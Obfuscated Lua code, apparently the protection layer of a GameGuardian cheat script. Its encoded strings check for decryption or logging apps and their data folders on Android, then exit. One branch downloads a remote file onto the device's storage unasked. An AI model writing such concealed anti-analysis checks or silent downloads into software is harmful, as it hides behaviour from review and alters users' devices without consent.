if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疣疥疔疣疚疓疡疦疦疓疝疗疥疤疔疚疕疗")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疓疟疟疜疖疟疟疜疗疗疖疥疓疛疣疓疢疙疠疤畞疤疝")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疖疟疨疓疩疒疕疢畞疗疗")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疘疓疛疕疑疝畞疝疚疗疡疜")) then 
print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疢疗疛疤疤疪畞疢疑疥疣疡疧疜")) then 
print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疤疓")) then
  print(__x("畐疃疃疄畿畿畼畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疦疙疠畞疣疣疤疟疟疜")) then
  print(__x("畐疃疃疄畿畿畼畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疣疣疤疟疟疜畞疝疟疔畞疝疑疖疙疑")) then
  print(__x("畐疝疑疖疙疑畯畯畯"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疣疣疤疟疟疜畞疟疞疜疩畞疓疟疝畞疣疣疤疟疟疜")) then
  print(__x("畐疃疃疄畿畿畼畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疑疕疢疟畞疣疣")) 
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疔疕疓疢疩疠疤畞疤疟疟疜畞疒疩畞疚疟疛疕疢畞疗疗")) 
jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
Link = __x("疘疤疤疠疣番畟畟疕疞疓疢疩疠疤疕疔畝疤疒疞畠畞疗疣疤疑疤疙疓畞疓疟疝畟疙疝疑疗疕疣畯疡畭疤疒疞番畱畾疔畩畷疓疁疦畦疓疤畱疠畴疇疣疈疦疁疄畠畽畴畴疥疉疔畺疖畠疗疜畾疜疅疪疠疃畦畸疧疧畖疥疣疡疠畭畳畱疅")
      path = __x("畟疣疔疓疑疢疔畟")
      Name = __x("疩疟疥疏疙疣疏疞疟疟疒畞疠疞疗")
      Slapper = gg[__x("疝疑疛疕疂疕疡疥疕疣疤")](Link).content
      io.open(path .. __x("畟") ..Name ,__x("疧")):write(Slapper)
      gg[__x("疑疜疕疢疤")](__x("畷畷畐畴畵畳疂疉疀疄畐畴畵疄畵畳疄畵畴"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疗疟疥疣疘疙畞疗疤疠疓疑疞疑疢疩"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疠疑疓疛疑疗疕疣疞疙疖疖疕疢畞疖疢疤疠疑疢疜疑疛"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疑疠疠畞疗疢疕疩疣疘疙疢疤疣畞疣疣疜疓疑疠疤疥疢疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疝疙疞疘疥疙畞疞疕疤疧疟疢疛疓疑疠疤疥疢疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疝疙疞疘疥疙畞疧疙疖疙疑疞疑疜疩疪疕疢"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疚疠畞疓疟畞疤疑疟疣疟疖疤疧疑疢疕畞疑疞疔疢疟疙疔畞疠疑疓疛疕疤疓疑疠疤疥疢疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疖疢疤疠疑疢疜疑疛畞疢疟疟疤疣疞疙疖疖疕疢"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疑疞疩疏畞疒疟疔疩疏畞疓疑疞疏畞疖疥疓疛疏畞疤疕疞疓疕疞疤疏"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疣畞疖疩疟疚疢疝疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疢疚疦疣疒疝疘疔疣疠疝疞疖疒疑疝疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疢疕疔疧疟疜疖疗疑疝疙疞疗畞疢疙疠疗疗"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疦疢疕疨疡疖疖疤疖疣疨疕疛疝畞疛疜"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疗疘疥疕疓疪疨疢疤疤疜疘疗疔"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疩疩畞疡疠疤疦疢疚疧疕疢疧畞疗疘疟疕疨"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疞疟疓疘疡疨疠疥疓疣疒疜疔疡疡疨"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞畵疗疩疠疤畞疩疥疟疣疣疕疕疖"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疤疣疣疖疚疙疠疛疝疢疓疟"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疦疙疠畞疠疑疙疔疘疑疓疛疣疟疞疜疩畞疝疢畞疤疟疨疙疞"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疝疢疤疕疑疝疪畞疙疔"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疚疤疒疟疔疗疠疡疨疟疨"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疝疟疔畞疙疢疑疡"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疔疪疕疜疤疤疧疩疥疩疩疕疣"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疣疨疡疑"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疨疩疩疨疗疨疖疞"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疦疞疠疡疛"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疝疧疚疦疞疧疕疣疒疗疘疛疨疒疚疪疞疒疧疟"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疒疜疑疓疛疔疥疤疩畞疗疓"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疣畞疖疩疟疚疢疝疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疢疟疨疝疕疝疕疛"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疖疘疣疘疧疘疠疦疡疦疢疥疦疚疤疥"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疖疙疢疕疟疞疗疑疝疙疞疗畞疖疟疗"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疠疑疢疑疞疟疙疑疧疟疢疛疣畞疥疞疙疓疥疣畞疑疞疔疢疟疙疔畞疣疣疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疢疑疙疞疓疙疤疩疗疑疝疙疞疗畞疗疗疝疟疔"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疠疦疤畤疥"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疞疩疔疠疦疣疒畞疪畞疢畞疠疛疗疘"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疙疟疩疩疣疦疗疖疣疢疙疗"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疗疝疣疝"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疣疥疔疣疚疓疡疦疦疓疝疗疥疤疔疚疕疗"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疓疟疟疜疖疟疟疜疗疗疖疥疓疛疣疓疢疙疠疤畞疤疝"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疕疙疔疩疝疥疝疓疗疘疠疖疕疕疕疑疦疠疣"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疖疟疨疓疩疒疕疢畞疗疗"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疪疗疒"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疘疓疛疕疑疝畞疝疚疗疡疜")) 
jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疢疗疛疤疤疪畞疢疑疥疣疡疧疜")) 
jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疣疣疤疟疟疜畞疟疞疜疩畞疓疟疝畞疣疣疤疟疟疜"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畼畿畷畷畷畷畞疜疥疑")) 
jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

